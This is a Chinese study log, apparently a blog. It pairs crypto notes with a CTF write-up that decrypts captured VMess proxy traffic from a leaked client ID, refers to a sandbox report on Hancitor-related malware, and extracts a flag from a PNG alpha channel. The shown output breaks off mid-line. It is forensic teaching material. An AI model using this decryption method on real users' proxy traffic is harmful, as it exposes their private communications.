<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">p = getPrime(512)</span><br><span class="line">q = getPrime(512)</span><br><span class="line">assert p &gt; q</span><br><span class="line">test1 = p % (q-1)</span><br><span class="line">test2 = p - q + 1</span><br><span class="line">print(test1)</span><br><span class="line">print(test2)</span><br></pre></td></tr></table></figure>

<p><em>不太理解。</em></p>
<h1 id="230417"><a href="#230417" class="headerlink" title="230417"></a>230417</h1><h2 id="Lattice"><a href="#Lattice" class="headerlink" title="Lattice"></a>Lattice</h2><ul>
<li>定义格空间，通常情况下$\mathbb{Z}^{n}$，数学定义下是$\mod n$，<strong>关键</strong>基向量，且可变。<ul>
<li><em>初始向量是基向量的定义源？</em></li>
</ul>
</li>
<li><em>多项式时间？</em></li>
<li>覆盖半径，无穷大时存在高斯分布-调和分析</li>
<li>上下界<ul>
<li>凸体理论</li>
</ul>
</li>
</ul>
<h2 id="线性相关-x2F-线性无关性质"><a href="#线性相关-x2F-线性无关性质" class="headerlink" title="线性相关&#x2F;线性无关性质"></a>线性相关&#x2F;线性无关性质</h2><img src="/2023/12/31/WeeklyStudy/image-20230417134326666.png" class="" title="image-20230417134326666">

<h1 id="230419"><a href="#230419" class="headerlink" title="230419"></a>230419</h1><h2 id="谍影重重"><a href="#谍影重重" class="headerlink" title="谍影重重"></a>谍影重重</h2><p>题目是一开始就上线了的，所以当时看到那份 <code>config.json</code> 就猜到了这是要做 vmess 的流量解析，于是翻出来了万恶的 vmess 文档，依照文档开始写解析脚本。</p>
<img src="/2023/12/31/WeeklyStudy/image-20230420103327152.png" class="" title="image-20230420103327152">

<p><code>req</code>的相关数据在这一流当中显示。</p>
<p>认证交互的数据在<code>Data</code>部分，直接复制它的值即可。</p>
<p>前16字节是认证哈希值。<em>后面的数据应该就是实际数据？</em></p>
<p>时间<code>Mar 12, 2021 14:02:42.667325408 中国标准时间</code></p>
<p>时间戳<code>1615528962.667325408</code></p>
<img src="/2023/12/31/WeeklyStudy/image-20230420105644289.png" class="" title="image-20230420105644289">

<p>利用数据包中的时间转换时间戳。</p>
<p>HMAC必须按照特定顺序输入需要的数值才可以。</p>
<img src="/2023/12/31/WeeklyStudy/image-20230420112127745.png" class="" title="image-20230420112127745">

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">vmess_hmac = <span class="keyword">lambda</span> x: hmac.new(client_id, x, hashlib.md5).hexdigest()</span><br></pre></td></tr></table></figure>



<p>p(64)一直没办法调用，仔细思考应该是库名冲突了。<code>pwntools</code>的调用是<code>from pwn import *</code>， 而之前又安装了不知名的<code>pwn</code>库，所以导致调用冲突吧。</p>
<img src="/2023/12/31/WeeklyStudy/image-20230421135041930.png" class="" title="image-20230421135041930">

<p>官方文档没更新，看源码3应该是<code>AES-128-GCM</code></p>
<h2 id="vmess协议"><a href="#vmess协议" class="headerlink" title="vmess协议"></a>vmess协议</h2><blockquote>
<p><a href="https://www.bookstack.cn/read/V2RAY/developer-protocols-vmess.md">协议细节 - VMess 协议 - 《Project V（V2RAY）文档手册》 - 书栈网 · BookStack</a></p>
</blockquote>
<h3 id="指令部分"><a href="#指令部分" class="headerlink" title="指令部分"></a>指令部分</h3><p>指令部分经过 AES-128-CFB 加密：</p>
<ul>
<li>Key：MD5(用户 ID + []byte(‘c48619fe-8f02-49e0-b9e9-edf763e17e21’))</li>
<li>IV：MD5(X + X + X + X)，X &#x3D; []byte(认证信息生成的时间) (8 字节, Big Endian)</li>
</ul>
<h2 id="更新pycharm中的第三方库"><a href="#更新pycharm中的第三方库" class="headerlink" title="更新pycharm中的第三方库"></a>更新pycharm中的第三方库</h2><p>右边出现尖角说明可以更新，直接点击进行相关界面，然后勾选安装特定版本即可安装到新版。</p>
<p>如果最新版本是测试版本的话，可以选其他版本。</p>
<h2 id="AES-128-GCM"><a href="#AES-128-GCM" class="headerlink" title="AES-128-GCM"></a>AES-128-GCM</h2><p>GCM（ Galois&#x2F;Counter Mode )<br>GCM中的G就是指GMAC，C就是指CTR。<br>GCM可以提供对消息的加密和完整性校验，另外，它还可以提供附加消息的完整性校验。在实际应用场景中，有些信息是我们不需要保密，但信息的接收者需要确认它的真实性的，例如源IP，源端口，目的IP，IV，等等。因此，我们可以将这一部分作为附加消息加入到MAC值的计算当中。下图的Ek表示用对称秘钥k对输入做AES运算。最后，密文接收者会收到密文、<strong>IV（计数器CTR的初始值）</strong>、MAC值。</p>
<img src="/2023/12/31/WeeklyStudy/Center.png" class="" title="img">

<h1 id="230421"><a href="#230421" class="headerlink" title="230421"></a>230421</h1><h2 id="继续整活谍影重重"><a href="#继续整活谍影重重" class="headerlink" title="继续整活谍影重重"></a>继续整活谍影重重</h2><blockquote>
<p><a href="https://any.run/report/0d7aa23a72d22dcf47f8723c58d101b3b113cbc79dd407a6fac0e65d67076ea1/2211f4a0-81e4-432d-87a8-c7c285a5a919">Malware analysis extracted_at_0x22a7b.exe Malicious activity | ANY.RUN - Malware Sandbox Online</a></p>
</blockquote>
<img src="/2023/12/31/WeeklyStudy/image-20230421105016271.png" class="" title="image-20230421105016271">

<p>9月26日，Proofpoint研究人员发现一起针对美国接收者的上万的垃圾邮件攻击活动。邮件使用eFax诱饵文件（图1）和URL链接来下载含有恶意宏的文档（图2）。如果用户启用了宏，宏文件就会执行嵌入的Hancitor恶意软件，恶意软件执行后会接收任务来下载两个版本的Pony窃取器和DanaBot银行木马。</p>
<ul>
<li>病毒分析</li>
</ul>
<blockquote>
<p><a href="https://any.run/report/0d7aa23a72d22dcf47f8723c58d101b3b113cbc79dd407a6fac0e65d67076ea1/2211f4a0-81e4-432d-87a8-c7c285a5a919">Malware analysis extracted_at_0x22a7b.exe Malicious activity | ANY.RUN - Malware Sandbox Online</a></p>
</blockquote>
<img src="/2023/12/31/WeeklyStudy/image-20230421150620900.png" class="" title="image-20230421150620900">

<p>得到<code>url = http://api.ipify.org</code></p>
<p>题目中所给的压缩包。</p>
<img src="/2023/12/31/WeeklyStudy/image-20230421150853675.png" class="" title="image-20230421150853675">

<p>根据提示md5一下，得到<code>08229f4052dde89671134f1784bed2d6</code></p>
<p>得到的文件使用<code>WINHEX</code>打开一下，发现提示了文件类型，是<code>Gob</code>文件</p>
<img src="/2023/12/31/WeeklyStudy/image-20230421151511429.png" class="" title="image-20230421151511429">

<p>利用属性来进行定义，从而反序列化。</p>
<img src="/2023/12/31/WeeklyStudy/image-20230421152349138.png" class="" title="image-20230421152349138">



<p>导包的时候出现了<code>missing path</code>，找了报错原因，没解决，后来发现是因为格式错了。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;math/rand&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p><em>搞出一张图片了，但没明白为啥图片的大小就是<code>70450bytes</code>，有点迷惑。</em></p>
<img src="/2023/12/31/WeeklyStudy/image-20230421155213728.png" class="" title="image-20230421155213728">

<p>没找到合适的工具提取隐写，十有八九是提取像素点的。</p>
<h3 id="最终exp"><a href="#最终exp" class="headerlink" title="最终exp"></a>最终exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@Author  :Eurynome</span></span><br><span class="line"><span class="string">@Date    :2023/4/19 17:19</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">config.json</span></span><br><span class="line"><span class="string">&quot;settings&quot;: &#123;</span></span><br><span class="line"><span class="string">                &quot;clients&quot;: [</span></span><br><span class="line"><span class="string">                    &#123;</span></span><br><span class="line"><span class="string">                        &quot;id&quot;: &quot;b831381d-6324-4d53-ad4f-8cda48b30811&quot;</span></span><br><span class="line"><span class="string">                    &#125;</span></span><br><span class="line"><span class="string">                ]</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">1111</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">client_id = uuid.UUID(<span class="string">&#x27;b831381d-6324-4d53-ad4f-8cda48b30811&#x27;</span>).<span class="built_in">bytes</span></span><br><span class="line"></span><br><span class="line">md5 = <span class="keyword">lambda</span> x: hashlib.md5(x).hexdigest()</span><br><span class="line">vmess_hmac = <span class="keyword">lambda</span> x: hmac.new(client_id, x, hashlib.md5).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">4dd11f9b04f2b562b9db539d939f1d52 b48b35bf592c09b21545392f73f6cef91143786464578c1c361aa72f638cd0135f25343555f509aef6c74cd2a2b86ee0a9eb3b93a81a541def4763cc54f91ba02681add1b815e8c50e028c76bde0ee8a9593db88d901066305a51a9586a9e377ee100e7d4d33fcfc0453c86b1998a95275cd9368a68820c2a6a540b6386c146ea7579cfe87b2e459856772efdcf0e4c6ab0f11d018a15561cf409cbc00491d7f4d22b7c486a76a5f2f25fbef503551a0aeb90ad9dd246a9cc5e0d0c0b751eb7b54b0abbfef198b1c4e5e755077469c318f20f3e418af03540811ab5c1ea780c886ea2c903b458a26</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">req = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;4dd11f9b04f2b562b9db539d939f1d52&#x27;</span> + <span class="string">&#x27;b48b35bf592c09b21545392f73f6cef91143786464578c1c361aa72f638cd0135f25343555f509aef6c74cd2a2b86ee0a9eb3b93a81a541def4763cc54f91ba02681add1b815e8c50e028c76bde0ee8a9593db88d901066305a51a9586a9e377ee100e7d4d33fcfc0453c86b1998a95275cd9368a68820c2a6a540b6386c146ea7579cfe87b2e459856772efdcf0e4c6ab0f11d018a15561cf409cbc00491d7f4d22b7c486a76a5f2f25fbef503551a0aeb90ad9dd246a9cc5e0d0c0b751eb7b54b0abbfef198b1c4e5e755077469c318f20f3e418af03540811ab5c1ea780c886ea2c903b458a26&#x27;</span>)</span><br><span class="line"><span class="comment"># print(req)</span></span><br><span class="line">cut_time = <span class="number">1615528962</span></span><br><span class="line">target_hash = req[:<span class="number">16</span>].<span class="built_in">hex</span>()</span><br><span class="line"><span class="comment"># print(target_hash)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_cmd_iv</span>(<span class="params">time, target_hash</span>):</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(time - <span class="number">50</span>, time + <span class="number">50</span>):</span><br><span class="line">        cur_hash = vmess_hmac(p64(t))</span><br><span class="line">        <span class="comment"># print(t)</span></span><br><span class="line">        <span class="comment"># print(cur_hash)</span></span><br><span class="line">        <span class="keyword">if</span> t == <span class="number">1615528982</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;time     = <span class="subst">&#123;t&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> md5(p64(t, endian=<span class="string">&#x27;big&#x27;</span>) * <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">cmd_key = md5(client_id + <span class="string">b&#x27;c48619fe-8f02-49e0-b9e9-edf763e17e21&#x27;</span>)</span><br><span class="line">cmd_iv = get_cmd_iv(cut_time, target_hash)</span><br><span class="line"><span class="comment"># print(type(cmd_iv))</span></span><br><span class="line"><span class="comment"># print(type(cmd_key))</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;cmd_key  = <span class="subst">&#123;cmd_key&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;cmd_iv   = <span class="subst">&#123;cmd_iv&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># time     = 1615528982</span></span><br><span class="line"><span class="comment"># cmd_key  = &quot;b50d916ac0cec067981af8e5f38a758f&quot;</span></span><br><span class="line"><span class="comment"># cmd_iv   = &quot;881eb47d4d3b67b24328c5178c0eedcc&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;------------------------------------------------&#x27;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">2222</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> fnvhash <span class="keyword">import</span> fnv1a_32</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">cmd_aes = <span class="keyword">lambda</span>: AES.new(<span class="built_in">bytes</span>.fromhex(cmd_key), AES.MODE_CFB, <span class="built_in">bytes</span>.fromhex(cmd_iv), segment_size=<span class="number">128</span>)</span><br><span class="line"></span><br><span class="line">cmd = req[<span class="number">16</span>:]</span><br><span class="line">ret = cmd_aes().decrypt(cmd)</span><br><span class="line"><span class="comment"># ret = bytes.fromhex(&#x27;0113277f5732da52ada790d87b8829daa95e4a9aa9ba58c7e3ad36fe2499dca259a20d6300011388017f0000011ace7d9bb0b539182c0381aa405d112d5d1dc1d33ec58e446b151f3331cd5209d25d1b065fa8754486e571584c46fa7d0ee443eb69abf466c28349e9020923cc8f472f1d20bbe05687b720e2cc8fab4dc173c232d6c815cb7c75c6bd74d2e2a57638effd11ff009c36384c431b123ed124965e218a79cfb91155fc55b81faf716aefb58328f295e76e352d11e90317ae8d209038ae70d19ee2f577c4841d77dc426431088a943244f50af3a2ffdf45b8ff210b2c4ff551076127fa&#x27;)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;ver      = <span class="subst">&#123;ret[<span class="number">0</span>:<span class="number">1</span>].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;dat_iv   = <span class="subst">&#123;ret[<span class="number">1</span>:<span class="number">17</span>].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;dat_key  = <span class="subst">&#123;ret[<span class="number">17</span>:<span class="number">33</span>].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;v        = <span class="subst">&#123;ret[<span class="number">33</span>:<span class="number">34</span>].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;opt      = <span class="subst">&#123;ret[<span class="number">34</span>]:b&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;p        = <span class="subst">&#123;ret[<span class="number">35</span>:<span class="number">36</span>].<span class="built_in">hex</span>()[<span class="number">0</span>]&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;sec      = <span class="subst">&#123;ret[<span class="number">35</span>:<span class="number">36</span>].<span class="built_in">hex</span>()[<span class="number">1</span>]&#125;</span>&quot;</span>)</span><br><span class="line">p = <span class="built_in">int</span>(ret[<span class="number">35</span>:<span class="number">36</span>].<span class="built_in">hex</span>()[<span class="number">0</span>], <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;cmd      = <span class="subst">&#123;ret[<span class="number">37</span>:<span class="number">38</span>].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;port     = <span class="subst">&#123;bytes_to_long(ret[<span class="number">38</span>:<span class="number">40</span>])&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;type     = <span class="subst">&#123;ret[<span class="number">40</span>:<span class="number">41</span>].<span class="built_in">hex</span>()&#125;</span>&quot;</span>) <span class="comment">#ipv4</span></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;host     = <span class="subst">&#123;<span class="string">&#x27;.&#x27;</span>.join(<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> ret[<span class="number">41</span>:<span class="number">45</span>])&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;rand     = <span class="subst">&#123;ret[<span class="number">45</span>:<span class="number">45</span> + p].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;F        = 0x<span class="subst">&#123;ret[<span class="number">45</span> + p:<span class="number">45</span> + p + <span class="number">4</span>].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;check    = <span class="subst">&#123;<span class="built_in">hex</span>(fnv1a_32(ret[:<span class="number">45</span> + p]))&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">3333</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHAKE128</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SizeParser</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, nonce</span>):</span><br><span class="line">        self.shake = SHAKE128.new(nonce)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> bytes_to_long(self.shake.read(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">self, size</span>):</span><br><span class="line">        <span class="keyword">return</span> self.<span class="built_in">next</span>() ^ size</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dec</span>(<span class="params">self, size</span>):</span><br><span class="line">        <span class="keyword">return</span> self.<span class="built_in">next</span>() ^ size</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next_padding</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.<span class="built_in">next</span>() % <span class="number">64</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;------------------------------------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">arr, key, iv</span>):</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    parser = SizeParser(iv)</span><br><span class="line">    output = []</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;dat_iv   = <span class="subst">&#123;key.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;dat_key  = <span class="subst">&#123;iv.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(arr) &gt; <span class="number">0</span>:</span><br><span class="line">        padding = parser.next_padding()</span><br><span class="line">        L = parser.dec(bytes_to_long(arr[:<span class="number">2</span>])) - padding</span><br><span class="line"></span><br><span class="line">        arr = arr[<span class="number">2</span>:]</span><br><span class="line">        e_iv = p64(count, endian=<span class="string">&#x27;big&#x27;</span>)[<span class="number">6</span>:] + iv[<span class="number">2</span>:<span class="number">12</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            dec = AES.new(key, AES.MODE_GCM, e_iv).decrypt_and_verify(arr[:L-<span class="number">16</span>], arr[L-<span class="number">16</span>:L])</span><br><span class="line">            output.append(dec)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[!] Decryption failed!&#x27;</span>)</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            arr = arr[L + padding:]</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data = cmd[<span class="number">45</span> + p + <span class="number">4</span>:]</span><br><span class="line">data_iv = ret[<span class="number">1</span>:<span class="number">17</span>]</span><br><span class="line">data_key = ret[<span class="number">17</span>:<span class="number">33</span>]</span><br><span class="line"><span class="comment"># print(type(data_key))</span></span><br><span class="line">pprint(decrypt(data, data_key, data_iv)[<span class="number">0</span>].decode().split(<span class="string">&#x27;\r\n&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">4444</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;------------------------------------------------&#x27;</span>)</span><br><span class="line">res = <span class="built_in">open</span>(<span class="string">&#x27;res.bytes&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"><span class="comment"># print(res)</span></span><br><span class="line">res_key = md5(data_key)</span><br><span class="line">res_iv = md5(data_iv)</span><br><span class="line"><span class="comment"># print(res_key)</span></span><br><span class="line"><span class="comment"># print(res_iv)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;res_key  = <span class="subst">&#123;res_key&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;res_iv   = <span class="subst">&#123;res_iv&#125;</span>&quot;</span>)</span><br><span class="line">res_aes = <span class="keyword">lambda</span>: AES.new(<span class="built_in">bytes</span>.fromhex(res_key), AES.MODE_CFB, <span class="built_in">bytes</span>.fromhex(res_iv), segment_size=<span class="number">128</span>)</span><br><span class="line">dec_res = res_aes().decrypt(res[:<span class="number">16</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;v        = <span class="subst">&#123;dec_res[<span class="number">0</span>:<span class="number">1</span>].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;opt      = <span class="subst">&#123;dec_res[<span class="number">1</span>:<span class="number">2</span>].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;cmd      = <span class="subst">&#123;dec_res[<span class="number">2</span>:<span class="number">3</span>].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c_l      = <span class="subst">&#123;dec_res[<span class="number">3</span>:<span class="number">4</span>].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">cmd_len = <span class="built_in">int</span>(dec_res[<span class="number">3</span>:<span class="number">4</span>].<span class="built_in">hex</span>(), <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;cmd      = <span class="subst">&#123;dec_res[<span class="number">4</span>:<span class="number">4</span>+cmd_len].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">data = res[<span class="number">4</span> + cmd_len:]</span><br><span class="line">plaintext = decrypt(data, <span class="built_in">bytes</span>.fromhex(res_key), <span class="built_in">bytes</span>.fromhex(res_iv))</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">5555</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># from base64 import b64decode</span></span><br><span class="line"><span class="comment"># data = &#x27;&#x27;.join(i.decode() for i in plaintext)</span></span><br><span class="line"><span class="comment"># start = data.find(&quot;atob(&#x27;&quot;) + len(&quot;atob(&#x27;&quot;)</span></span><br><span class="line"><span class="comment"># end = data.find(&quot;&#x27;);&quot;, start)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># binary = b64decode(data[start:end])</span></span><br><span class="line"><span class="comment"># check_sum = hashlib.sha256(binary).hexdigest()</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># open(&#x27;doc.zip&#x27;, &#x27;wb&#x27;).write(binary)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;------------------------------------------------&#x27;</span>)</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"></span><br><span class="line">data = <span class="string">&quot;&quot;</span>.join(i.decode() <span class="keyword">for</span> i <span class="keyword">in</span> plaintext)</span><br><span class="line"></span><br><span class="line">start = data.find(<span class="string">&quot;atob(&#x27;&quot;</span>) + <span class="built_in">len</span>(<span class="string">&quot;atob(&#x27;&quot;</span>)</span><br><span class="line">end = data.find(<span class="string">&quot;&#x27;);&quot;</span>, start)</span><br><span class="line"></span><br><span class="line">binary = b64decode(data[start:end])</span><br><span class="line">check_sum = hashlib.sha256(binary).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="comment"># open(&quot;doc.zip&quot;, &quot;wb&quot;).write(binary)</span></span><br><span class="line"><span class="built_in">print</span>(check_sum)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">6666</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;------------------------------------------------&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(md5(<span class="string">b&quot;api.ipify.org&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">7777</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;------------------------------------------------&#x27;</span>)</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&#x27;flag.png&#x27;</span>)</span><br><span class="line">arr = np.array(img)</span><br><span class="line"></span><br><span class="line">ans = <span class="built_in">bytes</span>(arr[:, :, <span class="number">3</span>].reshape(<span class="number">2000</span> * <span class="number">973</span>)).replace(<span class="string">b&#x27;\xff&#x27;</span>, <span class="string">b&#x27;&#x27;</span>).replace(<span class="string">b&#x27;\x00&#x27;</span>, <span class="string">b&#x27;&#x27;</span>).decode()[:<span class="number">42</span>]</span><br><span class="line"><span class="built_in">print</span>(ans)</span><br><span class="line"><span class="comment"># flag&#123;898161df-fabf-4757-82b6-ffe407c69475&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># from PIL import Image</span></span><br><span class="line"><span class="comment"># pic = Image.open(&#x27;flag.png&#x27;)</span></span><br><span class="line"><span class="comment"># w, h = pic.size</span></span><br><span class="line"><span class="comment"># flag = []</span></span><br><span class="line"><span class="comment"># for i in range(h):</span></span><br><span class="line"><span class="comment">#     for j in range(w):</span></span><br><span class="line"><span class="comment">#         piexl = list(pic.getpixel((j, i)))[3]</span></span><br><span class="line"><span class="comment">#         if(piexl != 0xff):</span></span><br><span class="line"><span class="comment">#             flag.append(chr(int(piexl)))</span></span><br><span class="line"><span class="comment">#             if len(flag) == 42:</span></span><br><span class="line"><span class="comment">#                 print(&#x27;&#x27;.join(flag))</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># output</span><br><span class="line">time     = 1615528982</span><br><span class="line">cmd_key  = b50d916ac0cec067981af8e5f38a758f</span><br><span class="line">cmd_iv   = 881eb47d4d3b67b24328c5178c0eedcc</span><br><span class="line">------------------------------------------------</span><br><span class="line">ver      = 01</span><br><span class="line">dat_iv   = 13277f5732da52ada790d87b8829daa9</span><br><span class="line">dat_key  = 5e4a9aa9ba58c7e3ad36fe2499dca259</span><br><span class="line">v        = a2</span><br><span class="line">opt      = 1101</span><br><span class="line">p        = 6</span><br><span class="line">sec      = 3</span><br><span class="line"></span><br><span class="line">cmd      = 01</span><br><span class="line">port     = 5000</span><br><span class="line">type     = 01</span><br><span class="line"></span><br><span class="line">host     = 127.0.0.1</span><br><span class="line">rand     = 1ace7d9bb0b5</span><br><span class="line">F        = 0x39182c03</span><br><span class="line">check    = 0x39182c03</span><br><span class="line">------------------------------------------------</span><br><span class="line">dat_iv   = 5e4a9aa9ba58c7e3ad36fe2499dca259</span><br><span class="line">dat_key  = 13277f5732da52ada790d87b8829daa9</span><br><span class="line">[&#x27;GET /out HTTP/1.1&#x27;,</span><br><span class="line"> &#x27;Host: 127.0.0.1:5000&#x27;,</span><br><span class="line"> &#x27;User-Agent: curl/7.75.0&#x27;,</span><br><span class="line"> &#x27;Accept: */*&#x27;,</span><br><span class="line"> &#x27;Connection: close&#x27;,</span><br><span class="line"> &#x27;&#x27;,</span><br><span class="line"> &#x27;&#x27;]</span><br><span class="line">------------------------------------------------</span><br><span class="line">res_key  = b22984cda4143a919b5b6de8121b6159</span><br><span class="line">res_iv   = fa2a8ab0fadb4854943df690335a99b5</span><br><span class="line">v        = a2</span><br><span class="line">opt      = 00</span><br><span class="line">cmd      = 00</span><br><span class="line">c_l      = 00</span><br><span class="line">cmd      = </span><br><span class="line">dat_iv   = b22984cda4143a919b5b6de8121b6159</span><br><span class="line">dat_key  = 